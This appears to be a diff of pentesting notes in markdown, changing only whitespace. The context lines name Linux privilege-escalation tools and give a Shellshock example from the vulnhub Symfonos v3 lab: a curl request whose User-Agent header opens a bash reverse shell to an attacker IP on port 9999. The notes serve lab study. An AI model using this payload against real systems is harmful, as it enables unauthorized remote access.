@@ -28,7 +28,7 @@ Notes related to Vuln Assmnt/PenTesting
 > 1. **Linpeas** or **LinEnum** or **Linux Exploit Suggester**
 
 #### cgi-bin folder or ShellShock
-> e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\ 
+> e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
 > curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh
 
 #### Portforwarding local service 8080
